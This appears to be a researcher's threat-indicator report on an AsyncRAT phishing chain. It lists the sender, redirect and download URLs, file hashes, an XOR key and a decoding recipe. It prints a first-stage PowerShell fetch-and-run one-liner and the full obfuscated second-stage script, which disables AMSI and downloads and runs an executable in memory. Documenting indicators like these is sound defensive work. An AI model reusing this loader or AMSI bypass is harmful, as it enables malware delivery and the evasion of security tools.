THREAT IDENTIFICATION:  ASYNCRAT

SUBJECTS OBSERVED
Subject was from a previously stolen email thread.

SENDERS OBSERVED
lunchakorn.p@advancepower.co.th

"404 TDS" URLS
https://healthereminders.com/tyo/nl6/fgai383ro1c

NEXT LEVEL REDIRECT URLS (Returned 404 for me)
https://wipeuganda.org/zrbfgwgf
https://wipeuganda.org/zrbfgwgf/

JAVASCRIPT FILE DOWNLOAD URL (Later successful attempt)
https://rasikhoon.org/zrbfgwgf/

JAVASCRIPT FILE HASH
Notice_3897003.js
f11d4bdc925efa443ec4b648074bac6b

POWERSHELL DOWNLOAD URLS
http://easdiv.top/1.php?hash=
http://easdiv.top/2.php?id=BUGS-BUNNY&key=94125549816

POWERSHELL SCRIPT FILE HASHES
1.php%3fhash=
88ac81ba7841c00e78b3b7811eedfcf2

2.php%3fid=BUGS-BUNNY&key=94125549816
f832747cfa3316c3345fada27593d95b

FIRST DOWNLOADED POWERSHELL SCRIPT
Simplifies to:
iex(curl -useb "http://easdiv.top/2.php?id=$env:computername&key=$nsekdofzhpyu")

XOR KEY
omy73eanw20b

CYBERCHEF RECIPE TO DECODE THE BASE64 BLOB IN FIRST POWERSHELL SCRIPT
From_Base64('A-Za-z0-9+/=',true,false)
XOR({'option':'Latin1','string':'omy73eanw20b'},'Standard',false)
Gunzip()

SECOND DOWNLOADED POWERSHELL SCRIPT
$Q = $null;
$acce = "$(('Syst'+'em').NorMaLizE([CHar]([byTe]0x46)+[chAr](46+65)+[CHar]([BYte]0x72)+[cHAR]([bYtE]0x6d)+[CHaR]([bytE]0x44)) -replace [CHAr]([ByTE]0x5c)+[cHaR]([bYtE]0x70)+[ChAR](123)+[chaR](77)+[cHAR](110+19-19)+[chAR]([byTE]0x7d)).$(('Mânãgeme'+'nt').normALiZE([CHar]([bYTe]0x46)+[CHAr](41+70)+[CHaR]([bytE]0x72)+[ChaR]([ByTE]0x6d)+[CHar](68+11-11)) -replace [CHaR]([bytE]0x5c)+[ChAR](112)+[Char](123+74-74)+[cHAr]([Byte]0x4d)+[CHAr](97+13)+[CHAR](125*89/89)).$(('Á'+'u'+'t'+'õ'+'m'+'â'+'t'+'î'+'ô'+'n').NOrmAlIZE([cHaR](70)+[CHAR]([BYTe]0x6f)+[cHar](114+105-105)+[ChAr]([BYtE]0x6d)+[ChaR]([BYte]0x44)) -replace [CHAr](92)+[cHAr](112*93/93)+[CHAr](123)+[char](77)+[cHAr]([byte]0x6e)+[ChaR](125*47/47)).$(('ÀmsìUt'+'îls').noRmAlize([char](70+6-6)+[CHAR]([bYte]0x6f)+[cHar](86+28)+[cHAR](109)+[cHar]([byTE]0x44)) -replace [CHaR]([bYtE]0x5c)+[chAr](112*84/84)+[ChaR](123*9/9)+[cHaR]([BytE]0x4d)+[CHAr](110+101-101)+[chaR](125*35/35))";
$piooz = "+('ydml'+'ftbg'+'mejg'+'nrrh'+'cpvs'+'vrîx').NOrmalizE([ChAR](70+28-28)+[ChAr]([bYTE]0x6f)+[Char](6+108)+[CHaR]([bYTe]0x6d)+[cHaR](68*41/41)) -replace [Char]([byTE]0x5c)+[ChAR]([BytE]0x70)+[chAr](123)+[chaR](77*12/12)+[ChAR](110+73-73)+[ChAr]([BytE]0x7d)";
[Threading.Thread]::Sleep(833);
[Ref].Assembly.GetType($acce).GetField($(('ámsíÎ' + 'nìtFä' + 'îled').NorMalizE([cHAR]([byte] 0x46) + [CHaR]([BYTe] 0x6f) + [chAr](114 * 62 / 62) + [CHar]([bYTE] 0x6d) + [chAR](68)) - replace[cHar]([byte] 0x5c) + [chAR]([BytE] 0x70) + [Char]([bYTE] 0x7b) + [cHAR]([Byte] 0x4d) + [chAr]([BYTE] 0x6e) + [cHAR](125 + 102 - 102)), "NonPublic,Static").SetValue($Q, $true);

$url = "https://temp.sh/bfseS/ruzxs.exe"

$client = New - Object System.Net.WebClient

# Download the assembly bytes
$assemblyBytes = $client.DownloadData($url)

# Load the assembly into memory
$assembly = [System.Reflection.Assembly]::Load($assemblyBytes)

# Execute the entry point of the assembly
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @())

PAYLOAD DOWNLOAD URL (FROM POWERSHELL SCRIPT)
https://temp.sh/bfseS/ruzxs.exe

PAYLOAD FILE HASH
The payload url is down - it has been for over 2 months.

ASYNCRAT C2
I was unable to get a payload.


